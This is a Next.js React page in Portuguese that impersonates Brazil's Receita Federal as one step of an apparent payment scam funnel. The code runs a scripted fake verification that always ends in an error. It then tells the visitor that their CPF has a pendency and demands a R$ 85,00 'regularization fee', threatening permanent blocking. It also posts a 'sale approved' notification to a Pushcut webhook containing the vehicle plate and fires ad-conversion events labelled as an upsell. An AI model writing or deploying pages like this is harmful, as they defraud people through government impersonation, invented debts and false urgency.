"use client";

import { useState, useEffect, useRef, Suspense } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";
import Script from "next/script";
import { AlertTriangle, Loader2 } from "lucide-react";

function PendenciaCPFContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const placa = searchParams.get("placa") || "";
  const valor = searchParams.get("valor") || "85.00";

  const notificationSent = useRef(false);
  const [loading, setLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [statusMessage, setStatusMessage] = useState("Verificando...");
  const [subMessage, setSubMessage] = useState("Processando informações...");

  useEffect(() => {
    if (!notificationSent.current) {
      notificationSent.current = true;
      fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Venda%20aprovada%20", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: `Pagamento confirmado - Placa: ${placa} - Upsell: Pendencia CPF` }),
      }).catch(() => {});

      const fireConversion = () => {
        if (typeof window !== "undefined" && (window as any).gtag) {
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028092080/fA0TCLnj0o0cELC1u5RD",
            value: 45.60,
            currency: "BRL",
            transaction_id: `${placa}-iof-${Date.now()}`,
          });
          (window as any).gtag("event", "conversion", {
            send_to: "AW-17936258767",
            value: 45.60,
            currency: "BRL",
          });
          return true;
        }
        return false;
      };

      if (!fireConversion()) {
        const interval = setInterval(() => {
          if (fireConversion()) clearInterval(interval);
        }, 500);
        setTimeout(() => clearInterval(interval), 10000);
      }
    }
  }, [placa]);

  useEffect(() => {
    const messages = [
      { progress: 0, status: "Verificando...", sub: "Processando informações..." },
      { progress: 25, status: "Verificando Pagamento...", sub: "Processando informações..." },
      { progress: 50, status: "Verificando Dados...", sub: "Analisando cadastro..." },
      { progress: 75, status: "Verificando Dados...", sub: "Consultando base de dados..." },
      { progress: 100, status: "Erro encontrado!", sub: "Pendência identificada" },
    ];

    let currentIndex = 0;
    
    const interval = setInterval(() => {
      if (currentIndex < messages.length) {
        setProgress(messages[currentIndex].progress);
        setStatusMessage(messages[currentIndex].status);
        setSubMessage(messages[currentIndex].sub);
        currentIndex++;
      } else {
        clearInterval(interval);
        setTimeout(() => {
          setLoading(false);
        }, 1000);
      }
    }, 1500);

    return () => clearInterval(interval);
  }, []);

  const handleRegularizar = () => {
    router.push(`/pixcpf?placa=${placa}&valor=85.00`);
  };

  if (loading) {
    return (
      <>
      <Script
        src="https://www.googletagmanager.com/gtag/js?id=AW-18028092080"
        strategy="afterInteractive"
      />
      <Script id="gtag-pendencia-principal" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'AW-18028092080');
        `}
      </Script>
      <Script
        src="https://www.googletagmanager.com/gtag/js?id=AW-17936258767"
        strategy="afterInteractive"
      />
      <Script id="gtag-pendencia" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'AW-17936258767');
        `}
      </Script>
      <div className="flex min-h-screen flex-col bg-[#1a3a5c]">
        {/* Header */}
        <header className="bg-[#152d47] py-4">
          <div className="flex justify-center px-4">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/receita%20logo-CcJylic56Yrlq63Gv5cnoS4Bw6Eqm7.png"
              alt="Receita Federal"
              width={200}
              height={60}
              className="h-12 w-auto"
            />
          </div>
        </header>

        {/* Loading Content */}
        <main className="flex flex-1 flex-col items-center justify-center px-6">
          <h1 className="mb-4 text-center text-2xl font-bold text-white">
            {statusMessage}
          </h1>
          <p className="mb-8 text-center text-base text-white/80">
            {subMessage}
          </p>

          {/* Progress Bar */}
          <div className="mb-8 h-3 w-full max-w-md overflow-hidden rounded-full bg-[#3b6a9e]">
            <div
              className="h-full rounded-full bg-[#f0c14b] transition-all duration-500 ease-out"
              style={{ width: `${progress}%` }}
            />
          </div>

          {/* Warning */}
          <div className="flex items-start gap-2 text-center">
            <AlertTriangle className="mt-0.5 h-5 w-5 shrink-0 text-[#f0c14b]" />
            <p className="text-sm text-white/70">
              <span className="font-semibold text-[#f0c14b]">Atenção:</span> O não pagamento pode causar o bloqueio definitivo do processo.
            </p>
          </div>
        </main>
      </div>
      </>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#1a3a5c]">
      {/* Header */}
      <header className="bg-[#152d47] py-4">
        <div className="flex justify-center px-4">
          <Image
            src="/images/receita-federal-logo.png"
            alt="Receita Federal"
            width={200}
            height={60}
            className="h-12 w-auto"
          />
        </div>
      </header>

      {/* Content */}
      <main className="flex flex-1 flex-col items-center justify-center px-6 py-8">
        {/* Warning Icon and Title */}
        <div className="mb-8 flex items-center gap-3">
          <AlertTriangle className="h-10 w-10 text-[#f0c14b]" />
          <h1 className="text-center text-2xl font-bold text-white">
            Pendência na Receita<br />Federal!
          </h1>
        </div>

        {/* Description */}
        <div className="mb-8 max-w-sm space-y-4 text-center">
          <p className="text-base text-white">
            Identificamos uma pendência relacionada ao seu{" "}
            <span className="font-semibold text-[#f0c14b]">CPF</span>.
          </p>
          <p className="text-base text-white">
            Para resolver, é necessário efetuar o pagamento da{" "}
            <span className="font-semibold text-[#f0c14b]">Taxa de Regularização</span>.
          </p>
          <p className="text-base text-white">
            O valor é de{" "}
            <span className="font-semibold text-[#f0c14b]">R$ 85,00</span>. Após o pagamento, sua solicitação será liberada imediatamente!
          </p>
        </div>

        {/* Button */}
        <button
          type="button"
          onClick={handleRegularizar}
          className="mb-8 w-full max-w-xs rounded-lg bg-[#f0c14b] py-4 text-lg font-bold text-[#1a3a5c] transition-colors hover:bg-[#e0b13b]"
        >
          REGULARIZAR AGORA
        </button>

        {/* Warning */}
        <div className="flex items-start gap-2 text-center">
          <AlertTriangle className="mt-0.5 h-5 w-5 shrink-0 text-[#f0c14b]" />
          <p className="text-sm text-white/70">
            <span className="font-semibold text-[#f0c14b]">Atenção:</span> O não pagamento pode causar o bloqueio definitivo do processo.
          </p>
        </div>
      </main>
    </div>
  );
}

export default function PendenciaCPFPage() {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-[#1a3a5c]">
          <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b]" />
        </div>
      }
    >
      <PendenciaCPFContent />
    </Suspense>
  );
}
